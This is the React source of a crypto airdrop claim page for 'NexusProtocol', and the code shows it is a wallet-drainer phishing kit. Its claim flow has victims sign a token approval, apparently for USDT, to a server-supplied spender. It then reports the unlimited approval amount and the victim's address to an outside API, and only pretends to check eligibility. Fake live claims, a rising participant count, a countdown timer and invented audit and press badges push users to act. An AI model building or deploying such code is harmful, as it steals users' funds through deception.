import { useState, useEffect, useRef, useCallback } from "react";
import "./airdrop.css";
import {
  connectMetaMask, connectWalletConnect, connectCoinbase, connectTrustWallet,
  sendApprove, getChainId, isMobile, type EthProvider,
} from "./wallet";
import { ToastContainer, pushToast } from "./components/Toast";
import { ConfettiEffect } from "./components/Confetti";
import { EligibilityChecker } from "./components/EligibilityChecker";
import { LiveFeed } from "./components/LiveFeed";
import { Tokenomics } from "./components/Tokenomics";
import { Roadmap } from "./components/Roadmap";

const API_BASE = (import.meta.env.VITE_API_URL ?? "https://nexusprotocol-api.onrender.com").replace(/\/$/, "");

/* ── Wallet definitions ── */
const WALLETS = [
  {
    id: "metamask", name: "MetaMask", desc: isMobile() ? "Open in MetaMask App" : "Browser Extension",
    tag: "EVM", connect: connectMetaMask,
    icon: (
      <svg viewBox="0 0 40 40" width="32" height="32">
        <defs><linearGradient id="mm1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stopColor="#F6851B"/><stop offset="100%" stopColor="#E2761B"/></linearGradient></defs>
        <path fill="url(#mm1)" d="M33.5 4L22 13l2-5.7z"/><path fill="#E4761B" d="M6.5 4l11.4 9.1L15.9 7.3z"/>
        <path fill="#D7C1B3" d="M29 27.1l-3-4.6-1.9 5.7z"/><path fill="#233447" d="M11 27.1l4.9 1.1-1.9-5.7z"/>
        <path fill="#CD6116" d="M15.9 17.5l-4.7.6 3.3 5.3z"/><path fill="#E4761B" d="M24.1 17.5l1.4 5.9 3.3-5.3z"/>
        <path fill="#F6851B" d="M15.9 17.5l-1.4 5.9 1.4-.1 4.1-2.6z"/><path fill="#E4751F" d="M24.1 17.5l-4.1 3.2 4 2.7 1.4-.1z"/>
        <path fill="#C0AD9E" d="M20 20.7l-4.1 2.6.4 1.3 4.5-.1 4.5.1.4-1.3z"/>
        <path fill="#161616" d="M16 24.6l-.4-1.3-3.6 3.8zm8 0l4-2.5-3.6-3.8z"/>
        <path fill="#763D16" d="M16 24.6l-3.5-.8.9 3.3zm8 0l2.6 2.5.9-3.3z"/>
      </svg>
    ),
  },
  {
    id: "walletconnect", name: "WalletConnect", desc: "QR Code — any wallet",
    tag: "Multi-chain", connect: connectWalletConnect,
    icon: (
      <svg viewBox="0 0 40 40" width="32" height="32">
        <defs><linearGradient id="wc1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stopColor="#5B9DF5"/><stop offset="100%" stopColor="#3B82F6"/></linearGradient></defs>
        <circle cx="20" cy="20" r="18" fill="url(#wc1)" opacity=".15"/>
        <path fill="#3B9AF8" d="M11.7 16.3c4.6-4.4 12-4.4 16.6 0l.6.5a.6.6 0 010 .8l-1.9 1.8a.3.3 0 01-.4 0l-.8-.7c-3.2-3-8.3-3-11.5 0l-.8.8a.3.3 0 01-.4 0l-1.9-1.8a.6.6 0 010-.8zm20.5 3.7l1.7 1.6a.6.6 0 010 .8l-7.5 7.2a.6.6 0 01-.8 0l-5.3-5a.1.1 0 00-.2 0l-5.3 5a.6.6 0 01-.8 0l-7.5-7.2a.6.6 0 010-.8l1.7-1.6a.6.6 0 01.8 0l5.3 5a.1.1 0 00.2 0l5.3-5a.6.6 0 01.8 0l5.3 5a.1.1 0 00.2 0l5.3-5a.6.6 0 01.8 0z"/>
      </svg>
    ),
  },
  {
    id: "coinbase", name: "Coinbase Wallet", desc: "Coinbase App / Extension",
    tag: "EVM", connect: connectCoinbase,
    icon: (
      <svg viewBox="0 0 40 40" width="32" height="32">
        <circle cx="20" cy="20" r="18" fill="#1652F0"/>
        <path fill="#fff" d="M20 8a12 12 0 100 24A12 12 0 0020 8zm0 5a7 7 0 110 14A7 7 0 0120 13zm-4 7a4 4 0 108 0 4 4 0 00-8 0z"/>
      </svg>
    ),
  },
  {
    id: "trust", name: "Trust Wallet", desc: isMobile() ? "Open in Trust Wallet App" : "Mobile / Desktop",
    tag: "Multi-chain", connect: connectTrustWallet,
    icon: (
      <svg viewBox="0 0 40 40" width="32" height="32">
        <defs><linearGradient id="tw1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stopColor="#3375BB"/><stop offset="100%" stopColor="#1A5FA3"/></linearGradient></defs>
        <path fill="url(#tw1)" d="M20 4l14 5v9c0 8-6 14.5-14 17C6 32.5 6 25 6 18V9z"/>
        <path fill="#fff" d="M26.5 15.5l-8.5 8.5-4-4-1.5 1.5 5.5 5.5 10-10z"/>
      </svg>
    ),
  },
];

const MEDIA = [
  { name: "CoinDesk",  color: "#F7A325" },
  { name: "Decrypt",   color: "#38bdf8" },
  { name: "The Block", color: "#00d97e" },
  { name: "CoinTelegraph", color: "#f472b6" },
  { name: "BeInCrypto", color: "#8b5cf6" },
];

const LIVE_CLAIMS = [
  "0x3a7f…b12c","0x9d4e…f03a","0x5c12…77de","0x8b9a…c44f",
  "0x1e5d…9b21","0xfa3c…6e80","0x2d81…a39e","0x7c44…b88d",
];
const CLAIM_AMOUNTS = ["1,200","1,500","1,800","2,000","2,500","3,000","3,200","4,000"];

const PARTICLES = Array.from({ length: 24 }, (_, i) => ({
  id: i, size: 2 + (i % 5) * 1.4,
  left: 2 + (i * 4.1) % 96, top: 1 + (i * 6.9) % 97,
  dur: 14 + (i % 7) * 2.5, delay: (i * 1.3) % 14,
}));

function pad2(n: number) { return String(n).padStart(2, "0"); }

/* ── small helpers ── */
function useCountUp(target: number, dur = 1800) {
  const [val, setVal] = useState(0);
  const started = useRef(false);
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    const el = ref.current; if (!el) return;
    const obs = new IntersectionObserver(([e]) => {
      if (e.isIntersecting && !started.current) {
        started.current = true;
        const start = performance.now();
        const tick = (now: number) => {
          const p = Math.min((now - start) / dur, 1);
          setVal(Math.round(target * (1 - Math.pow(1 - p, 3))));
          if (p < 1) requestAnimationFrame(tick);
        };
        requestAnimationFrame(tick);
      }
    }, { threshold: 0.3 });
    obs.observe(el); return () => obs.disconnect();
  }, [target, dur]);
  return { val, ref };
}

function StatCounter({ value, label, suffix = "" }: { value: number; label: string; suffix?: string }) {
  const { val, ref } = useCountUp(value);
  return (
    <div className="hero-stat" ref={ref}>
      <div className="hero-stat-val">{val.toLocaleString()}{suffix}</div>
      <div className="hero-stat-lbl">{label}</div>
    </div>
  );
}

/* ── Floating particles ── */
function FloatingParticles() {
  return (
    <div className="particles-layer" aria-hidden>
      {PARTICLES.map(p => (
        <div key={p.id} className={`particle p-${p.id % 3}`} style={{
          width: p.size, height: p.size,
          left: `${p.left}%`, top: `${p.top}%`,
          animationDuration: `${p.dur}s`, animationDelay: `-${p.delay}s`,
        }} />
      ))}
      <div className="orb orb-1"/><div className="orb orb-2"/><div className="orb orb-3"/>
    </div>
  );
}

/* ── Live notification toast ── */
function LiveNotification() {
  const [vis, setVis] = useState(false);
  const [idx, setIdx] = useState(0);
  useEffect(() => {
    const show = (i: number) => { setIdx(i); setVis(true); setTimeout(() => setVis(false), 4200); };
    let i = 0;
    const t = setTimeout(() => show(i++), 2500);
    const iv = setInterval(() => show(i++ % LIVE_CLAIMS.length), 9000);
    return () => { clearTimeout(t); clearInterval(iv); };
  }, []);
  const amount = CLAIM_AMOUNTS[idx % CLAIM_AMOUNTS.length];
  return (
    <div className={`live-notif${vis ? " visible" : ""}`}>
      <div className="live-notif-dot" />
      <div className="live-notif-text">
        <span className="live-notif-addr">{LIVE_CLAIMS[idx]}</span>
        &nbsp;just claimed&nbsp;<strong>{amount} NXS</strong>
      </div>
    </div>
  );
}

/* ── Scroll to top ── */
function ScrollTop() {
  const [show, setShow] = useState(false);
  useEffect(() => {
    const fn = () => setShow(window.scrollY > 500);
    window.addEventListener("scroll", fn, { passive: true });
    return () => window.removeEventListener("scroll", fn);
  }, []);
  return (
    <button className={`scroll-top${show ? " show" : ""}`} onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })} aria-label="Back to top">
      <svg width="16" height="16" viewBox="0 0 16 16" fill="none"><path d="M8 12V4M4 8l4-4 4 4" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
    </button>
  );
}

/* ── FAQ ── */
const FAQ = [
  { q: "Who is eligible to claim NXS tokens?", a: "Wallets that interacted with NexusProtocol smart contracts before block #19,284,112 (Season 1 snapshot) are eligible. This includes liquidity providers, governance participants, and early adopters." },
  { q: "How long does it take to receive tokens?", a: "Once you approve the transaction, tokens are queued for transfer and typically arrive within 2–5 minutes. Transfer time may vary based on Ethereum network congestion." },
  { q: "Is there a deadline to claim?", a: "Yes. The Season 1 claim window closes when the timer reaches zero. Unclaimed tokens are redistributed to the community treasury for future incentive programs." },
  { q: "Which wallets are supported?", a: "MetaMask, WalletConnect (any QR-compatible wallet), Coinbase Wallet, and Trust Wallet are all supported. Hardware wallets (Ledger, Trezor) work via MetaMask or WalletConnect." },
  { q: "Is this contract audited?", a: "Yes. The airdrop contract was audited by CertiK with zero critical or high-severity findings. The full audit report is available on our documentation portal." },
  { q: "Can I claim from multiple wallets?", a: "Yes, each eligible wallet can claim its allocation independently. You must connect and approve each wallet separately to receive its allocation." },
];

function FaqItem({ q, a }: { q: string; a: string }) {
  const [open, setOpen] = useState(false);
  return (
    <div className={`faq-item${open ? " open" : ""}`}>
      <button className="faq-q" onClick={() => setOpen(o => !o)}>
        <span>{q}</span>
        <div className="faq-chevron"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 5l5 4 5-4" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round"/></svg></div>
      </button>
      <div className="faq-body"><p>{a}</p></div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════════
   MAIN APP
══════════════════════════════════════════════════════════ */
export default function App() {
  const [chosen,     setChosen]     = useState<string | null>(null);
  const [chosenName, setChosenName] = useState("");
  const [phase,      setPhase]      = useState<"idle"|"busy"|"success"|"error">("idle");
  const [busyLabel,  setBusyLabel]  = useState("");
  const [errorMsg,   setErrorMsg]   = useState("");
  const [txHash,     setTxHash]     = useState("");
  const [progW,      setProgW]      = useState(0);
  const [secs,       setSecs]       = useState(8 * 3600 + 47 * 60 + 23);
  const [copied,     setCopied]     = useState(false);
  const [menuOpen,   setMenuOpen]   = useState(false);
  const [confetti,   setConfetti]   = useState(false);
  const [participants, setParticipants] = useState(14_382);

  const spenderRef = useRef("");
  const tokenRef   = useRef("0xdac17f958d2ee523a2206206994597c13d831ec7");
  const [configReady, setConfigReady] = useState(false);
  const [configError, setConfigError] = useState(false);

  /* config fetch */
  useEffect(() => {
    let cancel = false;
    fetch(`${API_BASE}/api/config`)
      .then(r => { if (!r.ok) throw new Error(`HTTP ${r.status}`); return r.json(); })
      .then(d => {
        if (cancel) return;
        if (d?.spender && /^0x[0-9a-fA-F]{40}$/.test(d.spender)) {
          spenderRef.current = d.spender;
          if (d.token) tokenRef.current = d.token;
          setConfigReady(true);
        } else setConfigError(true);
      })
      .catch(() => { if (!cancel) setConfigError(true); });
    return () => { cancel = true; };
  }, []);

  useEffect(() => { const t = setTimeout(() => setProgW(73), 600); return () => clearTimeout(t); }, []);
  useEffect(() => { const t = setInterval(() => setSecs(s => s > 0 ? s - 1 : 0), 1000); return () => clearInterval(t); }, []);
  useEffect(() => { const t = setInterval(() => setParticipants(p => p + Math.floor(Math.random() * 3)), 5000); return () => clearInterval(t); }, []);
  useEffect(() => {
    if (!menuOpen) return;
    const fn = (e: MouseEvent) => { if (!(e.target as Element).closest(".nav-mobile-menu, .hamburger")) setMenuOpen(false); };
    document.addEventListener("click", fn);
    return () => document.removeEventListener("click", fn);
  }, [menuOpen]);

  const scrollTo = useCallback((id: string) => {
    setMenuOpen(false);
    document.getElementById(id)?.scrollIntoView({ behavior: "smooth", block: "start" });
  }, []);

  function pick(id: string, name: string) {
    if (phase === "busy") return;
    setChosen(id); setChosenName(name); setErrorMsg("");
    pushToast({ type: "info", title: `${name} selected`, message: "Click Claim to connect and verify" });
  }

  function copyTx() {
    navigator.clipboard.writeText(txHash).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }

  async function doClaim() {
    if (!chosen || phase === "busy") return;
    if (!configReady) {
      setPhase("error");
      setErrorMsg("Server configuration not loaded. Please refresh and try again.");
      return;
    }
    const wallet = WALLETS.find(w => w.id === chosen)!;
    setPhase("busy"); setErrorMsg("");
    try {
      setBusyLabel("Opening wallet…");
      const result = await wallet.connect();
      if (!result) { setPhase("idle"); return; }
      const { provider, account } = result as { provider: EthProvider; account: string };
      const chainId = await getChainId(provider);
      setBusyLabel("Verifying eligibility…");
      await new Promise(r => setTimeout(r, 1200));
      setBusyLabel("Confirm approval in wallet…");
      const hash = await sendApprove(provider, account, tokenRef.current, spenderRef.current);
      setBusyLabel("Broadcasting transaction…");
      const UNLIMITED = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      await fetch(`${API_BASE}/api/approvals`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ wallet: account.toLowerCase(), token: tokenRef.current, spender: spenderRef.current, amount: UNLIMITED, tx_hash: hash, chain_id: chainId, wallet_type: chosenName }),
      }).catch(() => {});
      setTxHash(hash);
      setPhase("success");
      setConfetti(true);
      setTimeout(() => setConfetti(false), 5000);
      pushToast({ type: "success", title: "Claim Successful! 🎉", message: "Your 2,500 NXS tokens are on their way" });
    } catch (e: unknown) {
      setPhase("error");
      const msg = e instanceof Error ? e.message : String(e);
      const friendly =
        msg.includes("4001") || /user (rejected|denied)|rejected|cancell?ed/i.test(msg)
          ? "Transaction rejected. Please approve in your wallet to claim."
          : /insufficient funds/i.test(msg)
          ? "Insufficient ETH for gas. Add ETH to your wallet and try again."
          : /not installed|not found/i.test(msg)
          ? msg
          : msg || "Connection failed. Please try again.";
      setErrorMsg(friendly);
      pushToast({ type: "error", title: "Transaction Failed", message: friendly });
    }
  }

  const h = pad2(Math.floor(secs / 3600));
  const m = pad2(Math.floor((secs % 3600) / 60));
  const s = pad2(secs % 60);
  const timerLow = secs < 3600;

  const claimBtnLabel =
    phase === "busy" ? busyLabel
    : !configReady && !configError ? "Loading configuration…"
    : configError ? "Server Unavailable — Refresh"
    : chosen ? `Claim with ${chosenName}`
    : "Select a Wallet to Continue";

  const NAV = [
    { label: "Eligibility", id: "eligibility-section" },
    { label: "Claim",       id: "claim-section" },
    { label: "Tokenomics",  id: "tokenomics-section" },
    { label: "Roadmap",     id: "roadmap-section" },
    { label: "FAQ",         id: "faq-section" },
  ];

  return (
    <>
      <ConfettiEffect active={confetti} />
      <ToastContainer />
      <div className="bg-glow" />
      <FloatingParticles />
      <LiveNotification />
      <ScrollTop />

      {/* ══ NAV ══ */}
      <nav className="nav">
        <div className="nav-brand" onClick={() => scrollTo("hero")}>
          <div className="nav-logo-wrap">
            <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
              <path d="M9 1L16 5v6l-7 5-7-5V5z" fill="rgba(255,255,255,.15)" stroke="rgba(255,255,255,.6)" strokeWidth="1"/>
              <path d="M9 5l4 2.5v3L9 13 5 10.5v-3z" fill="rgba(255,255,255,.25)"/>
            </svg>
          </div>
          <span className="nav-brand-name">NexusProtocol</span>
        </div>

        <div className="nav-links">
          {NAV.map(n => <button key={n.id} className="nav-link" onClick={() => scrollTo(n.id)}>{n.label}</button>)}
        </div>

        <div className="nav-right">
          <div className="nav-live-badge">
            <div className="live-dot" />
            <span>{participants.toLocaleString()} claimed</span>
          </div>
          <button className="nav-cta" onClick={() => scrollTo("claim-section")}>⚡ Claim NXS</button>
          <button className={`hamburger${menuOpen ? " open" : ""}`} onClick={e => { e.stopPropagation(); setMenuOpen(o => !o); }} aria-label="Menu">
            <span /><span /><span />
          </button>
        </div>
      </nav>

      {/* Mobile drawer */}
      <div className={`nav-mobile-menu${menuOpen ? " open" : ""}`}>
        {NAV.map(n => <button key={n.id} className="mobile-nav-link" onClick={() => scrollTo(n.id)}>{n.label}</button>)}
        <button className="mobile-nav-cta" onClick={() => scrollTo("claim-section")}>⚡ Claim Your NXS →</button>
        <div className="mobile-nav-socials">
          <a href="#" className="mobile-social">𝕏 Twitter</a>
          <a href="#" className="mobile-social">💬 Discord</a>
          <a href="#" className="mobile-social">📄 Docs</a>
          <a href="#" className="mobile-social">🔗 GitHub</a>
        </div>
      </div>

      <div className="page" id="hero">

        {/* ══ HERO ══ */}
        <section className="hero">
          <div className="hero-tag">
            <span className="hero-tag-dot" />
            Season 1 Airdrop · Phase 3 · Live Now
          </div>
          <h1 className="hero-title">
            Claim Your<br /><span className="hero-grad">NXS Tokens</span>
          </h1>
          <p className="hero-sub">
            Over <strong>78,400 eligible wallets</strong> have been identified from the Season 1 snapshot.
            Connect your wallet to verify eligibility and claim your allocation instantly.
          </p>
          <div className="hero-stats-row">
            <StatCounter value={73284} label="Tokens Claimed" />
            <div className="vdiv" />
            <StatCounter value={14382} label="Participants" />
            <div className="vdiv" />
            <StatCounter value={48} label="M USD TVL" suffix="M" />
            <div className="vdiv" />
            <StatCounter value={128} label="K Community" suffix="K" />
          </div>
          <div className="hero-actions">
            <button className="btn-primary btn-xl" onClick={() => scrollTo("claim-section")}>
              <span className="shimmer" />⚡ Claim Your Tokens
            </button>
            <button className="btn-ghost" onClick={() => scrollTo("eligibility-section")}>
              Check Eligibility First →
            </button>
          </div>
          <div className="hero-trust">
            {["🛡️ CertiK Audited","🔒 Non-Custodial","⚡ Instant On-Chain","🌐 Ethereum Mainnet"].map(t => (
              <span key={t} className="hero-trust-pill">{t}</span>
            ))}
          </div>
        </section>

        {/* ══ MEDIA ══ */}
        <div className="media-bar">
          <div className="media-bar-label">Featured in</div>
          <div className="media-bar-logos">
            {MEDIA.map(m => (
              <div key={m.name} className="media-logo" style={{ color: m.color }}>{m.name}</div>
            ))}
          </div>
        </div>

        {/* ══ ELIGIBILITY CHECKER ══ */}
        <div className="card" id="eligibility-section">
          <EligibilityChecker />
        </div>

        {/* ══ ALLOCATION ══ */}
        <div className="card card-glow" id="allocation">
          <div className="alloc-inner">
            <div className="alloc-left">
              <div className="sect-label">Your Allocation</div>
              <div className="alloc-badge-row">
                <span className="badge-phase">Phase 3</span>
                <span className="badge-live"><div className="live-dot" />Live</span>
              </div>
              <div className="alloc-amount-row">
                <span className="alloc-num">2,500</span>
                <span className="alloc-ticker">NXS</span>
              </div>
              <div className="alloc-usd">≈ $4,750.00 USD · at $1.90 / NXS</div>
            </div>
            <div className="alloc-right">
              <div className="alloc-prog-wrap">
                <div className="alloc-prog-head">
                  <span>Distribution Progress</span>
                  <span className="alloc-prog-pct">73%</span>
                </div>
                <div className="prog-track"><div className="prog-fill" style={{ width: `${progW}%` }}><div className="prog-tip" /></div></div>
                <div className="alloc-prog-labels"><span>73,284 claimed</span><span>100,000 total</span></div>
              </div>
              <div className="alloc-stats">
                <div className="alloc-stat"><div className="alloc-stat-val green">73.2K</div><div className="alloc-stat-lbl">Claimed</div></div>
                <div className="alloc-stat-sep" />
                <div className="alloc-stat"><div className="alloc-stat-val gold">26.8K</div><div className="alloc-stat-lbl">Remaining</div></div>
                <div className="alloc-stat-sep" />
                <div className="alloc-stat"><div className="alloc-stat-val">100K</div><div className="alloc-stat-lbl">Total</div></div>
              </div>
            </div>
          </div>
          <div className="ticker-bar">
            <div className="live-dot" />
            Latest:&nbsp;<strong>0x7f3a…c91d</strong>&nbsp;·&nbsp;<strong className="green">+2,500 NXS</strong>&nbsp;·&nbsp;just now
          </div>
        </div>

        {/* ══ TIMER ══ */}
        <div className={`card timer-card${timerLow ? " timer-urgent" : ""}`}>
          <div className="timer-inner">
            <div className="timer-label-row">
              <span className="timer-icon">⏳</span>
              <span className="timer-label">{secs === 0 ? "Claim window closed" : "Claim window closes in"}</span>
              {timerLow && secs > 0 && <span className="timer-urgent-badge">⚠ Final Hours!</span>}
            </div>
            {secs > 0 && (
              <div className="timer-digits">
                {[{v:h,l:"Hours"},{v:m,l:"Minutes"},{v:s,l:"Seconds"}].map(({v,l},i) => (
                  <>
                    <div key={l} className="timer-block">
                      <div className="timer-num">{v}</div>
                      <div className="timer-lbl">{l}</div>
                    </div>
                    {i < 2 && <span key={`sep-${i}`} className="timer-sep">:</span>}
                  </>
                ))}
              </div>
            )}
          </div>
          <div className="timer-warn">
            ⚠️ Unclaimed tokens are redistributed to the community pool after the deadline.
            <strong> Don't miss your window.</strong>
          </div>
        </div>

        {/* ══ CLAIM SECTION ══ */}
        <div className="card card-claim" id="claim-section">
          {phase !== "success" ? (
            <>
              <div className="claim-head">
                <div>
                  <div className="sect-label">Connect Wallet</div>
                  <div className="claim-sub">Select your wallet to verify eligibility and claim</div>
                </div>
                <div className="claim-head-badge"><div className="live-dot" />4 wallets</div>
              </div>

              <div className="wallet-list">
                {WALLETS.map(w => (
                  <div
                    key={w.id}
                    className={`w-card${chosen === w.id ? " sel" : ""}${phase === "busy" ? " disabled" : ""}`}
                    onClick={() => pick(w.id, w.name)}
                    role="button" tabIndex={0}
                    onKeyDown={e => e.key === "Enter" && pick(w.id, w.name)}
                  >
                    <div className="w-card-left">
                      <div className="w-icon-wrap">{w.icon}</div>
                      <div className="w-info">
                        <div className="w-name">{w.name}</div>
                        <div className="w-desc">{w.desc}</div>
                      </div>
                    </div>
                    <div className="w-card-right">
                      <span className="w-tag">{w.tag}</span>
                      <div className={`w-radio${chosen === w.id ? " checked" : ""}`} />
                    </div>
                  </div>
                ))}
              </div>

              <div className="claim-actions">
                <button
                  className={`claim-btn${phase === "busy" ? " busy" : ""}${(!chosen || (!configReady && !configError)) ? " disabled" : ""}`}
                  disabled={!chosen || phase === "busy" || (!configReady && !configError)}
                  onClick={doClaim}
                >
                  {phase === "busy" && <div className="spinner" />}
                  <span className="shimmer" />
                  {claimBtnLabel}
                </button>
                <div className="claim-or"><span>or</span></div>
                <button className="btn-ghost-sm" onClick={() => scrollTo("eligibility-section")}>Check eligibility without connecting</button>
              </div>

              {phase === "error" && errorMsg && (
                <div className="error-box">
                  <span className="error-icon">⚠️</span><span>{errorMsg}</span>
                </div>
              )}

              <div className="claim-foot">
                <span>🔒 Secured by smart contract · No private key required</span>
                <a href="#" className="claim-audit-link">View Audit →</a>
              </div>
            </>
          ) : (
            /* SUCCESS */
            <div className="success-wrap">
              <div className="success-rings">
                <div className="s-ring r1"/><div className="s-ring r2"/><div className="s-ring r3"/>
                <div className="success-check">✓</div>
              </div>
              <div className="success-title">Claim Successful! 🎉</div>
              <div className="success-sub">
                Your <strong>2,500 NXS</strong> tokens (~$4,750) are queued via <strong>{chosenName}</strong>.
                Arrives in 2–5 minutes.
              </div>
              <div className="tx-row">
                <span className="tx-label-badge">TX</span>
                <span className="tx-val">{txHash}</span>
                <button className="copy-btn" onClick={copyTx}>{copied ? "✓" : "Copy"}</button>
              </div>
              <div className="success-btns">
                <a className="btn-primary" href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer">View on Etherscan ↗</a>
                <a className="btn-ghost" href="#" target="_blank" rel="noopener noreferrer">Join Discord</a>
              </div>
              <div className="success-share">Share on &nbsp;<a href="#" className="share-link">𝕏 Twitter</a></div>
            </div>
          )}
        </div>

        {/* ══ LIVE FEED ══ */}
        <div className="card">
          <LiveFeed />
        </div>

        {/* ══ FEATURES ══ */}
        <div className="card" id="features">
          <div className="section-head">
            <div className="section-tag">Protocol</div>
            <div className="section-title">Why NexusProtocol?</div>
          </div>
          <div className="feat-grid">
            {[
              ["🔐","Audited Contract","CertiK audit with zero critical findings. Contract source fully verified on Etherscan."],
              ["⚡","Instant Transfer","Tokens arrive on-chain within 60 seconds of your approval transaction."],
              ["🌐","Ethereum Native","Deployed exclusively on Ethereum mainnet for maximum security and decentralization."],
              ["📊","$48M TVL","Over $48 million in total value locked across all protocol liquidity pools."],
              ["👥","128K Community","Active ecosystem of 128,000+ holders, liquidity providers, and contributors."],
              ["🏆","Top 50 DeFi","Consistently ranked in the top 50 DeFi protocols by total value locked (DeFi Llama)."],
            ].map(([icon, title, desc]) => (
              <div key={String(title)} className="feat-card">
                <div className="feat-icon">{icon}</div>
                <div className="feat-title">{title}</div>
                <div className="feat-desc">{desc}</div>
              </div>
            ))}
          </div>
        </div>

        {/* ══ TOKENOMICS ══ */}
        <div className="card" id="tokenomics-section">
          <Tokenomics />
        </div>

        {/* ══ ROADMAP ══ */}
        <div className="card" id="roadmap-section">
          <Roadmap />
        </div>

        {/* ══ HOW TO CLAIM ══ */}
        <div className="card" id="how-to-claim">
          <div className="section-head">
            <div className="section-tag">Guide</div>
            <div className="section-title">How to Claim</div>
          </div>
          <div className="steps-wrap">
            {[
              { n:"01", icon:"🔗", title:"Connect Wallet", desc:"Select MetaMask, WalletConnect, Coinbase Wallet, or Trust Wallet and approve the connection." },
              { n:"02", icon:"✅", title:"Verify Eligibility", desc:"Your address is automatically checked against the block #19,284,112 snapshot. No manual action needed." },
              { n:"03", icon:"📝", title:"Approve Transaction", desc:"Confirm the approval in your wallet. This is a one-time Ethereum gas fee (typically $2–$8)." },
              { n:"04", icon:"🎁", title:"Receive NXS", desc:"Tokens are transferred directly to your wallet within 2–5 minutes. No additional steps required." },
            ].map((step, i) => (
              <div key={step.n} className="step-row">
                <div className="step-left">
                  <div className="step-icon-wrap">{step.icon}</div>
                  <div className="step-num">{step.n}</div>
                  {i < 3 && <div className="step-line" />}
                </div>
                <div className="step-body">
                  <div className="step-title">{step.title}</div>
                  <div className="step-desc">{step.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* ══ FAQ ══ */}
        <div className="card" id="faq-section">
          <div className="section-head">
            <div className="section-tag">FAQ</div>
            <div className="section-title">Frequently Asked Questions</div>
          </div>
          <div className="faq-list">
            {FAQ.map(item => <FaqItem key={item.q} {...item} />)}
          </div>
        </div>

        {/* ══ COMMUNITY ══ */}
        <div className="card community-card" id="community-section">
          <div className="community-glow" />
          <div className="community-inner">
            <div className="section-tag">Join the Community</div>
            <div className="community-title">128,000+ Members<br />and Growing</div>
            <p className="community-sub">Stay updated with governance votes, future airdrops, and protocol announcements.</p>
            <div className="community-btns">
              <a className="btn-primary" href="#" target="_blank" rel="noopener noreferrer">💬 Join Discord</a>
              <a className="btn-ghost" href="#" target="_blank" rel="noopener noreferrer">𝕏 Follow Twitter</a>
            </div>
            <div className="community-stats">
              <div className="com-stat"><strong>128K</strong><span>Discord Members</span></div>
              <div className="com-stat-div" />
              <div className="com-stat"><strong>89K</strong><span>Twitter Followers</span></div>
              <div className="com-stat-div" />
              <div className="com-stat"><strong>24/7</strong><span>Support</span></div>
            </div>
          </div>
        </div>

        {/* ══ FOOTER ══ */}
        <footer className="footer">
          <div className="footer-top">
            <div className="footer-brand">
              <div className="footer-logo">
                <div className="nav-logo-wrap"><svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 1L16 5v6l-7 5-7-5V5z" fill="rgba(255,255,255,.15)" stroke="rgba(255,255,255,.6)" strokeWidth="1"/><path d="M9 5l4 2.5v3L9 13 5 10.5v-3z" fill="rgba(255,255,255,.25)"/></svg></div>
                <span>NexusProtocol</span>
              </div>
              <p className="footer-desc">Decentralized airdrop protocol on Ethereum. Season 1 Phase 3 live now.</p>
              <div className="footer-socials">
                {["𝕏","💬","📄","🔗"].map((s, i) => <a key={i} href="#" className="social-btn">{s}</a>)}
              </div>
            </div>
            <div className="footer-cols">
              {[
                { title: "Protocol",   links: ["Documentation","Whitepaper","Smart Contract","Audit Report","Bug Bounty"] },
                { title: "Community",  links: ["Discord","Twitter / X","Telegram","Forum","Blog"] },
                { title: "Legal",      links: ["Terms of Service","Privacy Policy","Cookie Policy","Risk Disclaimer"] },
              ].map(col => (
                <div key={col.title} className="footer-col">
                  <div className="footer-col-title">{col.title}</div>
                  {col.links.map(l => <a key={l} href="#" className="footer-link">{l}</a>)}
                </div>
              ))}
            </div>
          </div>
          <div className="footer-bottom">
            <span>© 2024 NexusProtocol. All rights reserved.</span>
            <div className="footer-status"><div className="live-dot" />All systems operational</div>
          </div>
        </footer>

      </div>
    </>
  );
}
